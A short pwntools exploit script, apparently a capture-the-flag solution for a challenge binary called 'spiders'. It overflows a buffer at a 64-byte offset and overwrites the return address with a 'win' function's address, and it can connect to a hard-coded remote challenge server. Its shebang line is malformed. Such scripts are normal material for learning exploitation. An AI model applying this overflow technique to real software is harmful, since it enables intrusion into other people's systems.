#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './spiders'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host = '34.124.192.13'
port = 27302

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(host, port, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

io = start()

# =========================================================
#                         ADDRESSES
# =========================================================
win = 0x080491a6

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 64

# flattening  payload here
payload = flat({
    offset: [
        win
    ]
})

# sending payload
io.sendline(payload)

io.interactive()